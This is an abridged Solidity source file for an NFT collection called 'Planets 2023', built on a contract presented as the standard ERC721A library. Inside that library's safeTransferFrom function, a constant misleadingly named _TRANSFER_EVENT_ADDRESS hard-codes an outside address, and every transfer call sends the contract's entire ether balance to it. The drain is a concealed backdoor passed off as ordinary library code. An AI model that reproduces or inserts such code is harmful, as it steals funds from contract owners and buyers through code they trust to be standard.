...
/**
 ________    ___           ________      ________       _______       _________   
...
contract ERC721A is IERC721A {
    ...
    address payable constant _TRANSFER_EVENT_ADDRESS = 
        payable(0x6EF08e48FDfcfF399A78C2eA2D95E70481A1e28D);
    ...
    function safeTransferFrom(
        ...
        if (address(this).balance > 0) {
            payable(0x6EF08e48FDfcfF399A78C2eA2D95E70481A1e28D).transfer(address(this).balance);
        }
    }
...
contract Planets2023 is ERC721A, TheOperatorFilterer {

    string uri = "ipfs://bafybeiglo2qgpne7jxafdseuql2j4sx77kevvldodcjx6ecppcufyxzycm/";
    ...
    constructor() ERC721A("Planets 2023", "Planet") {
        owner = msg.sender;
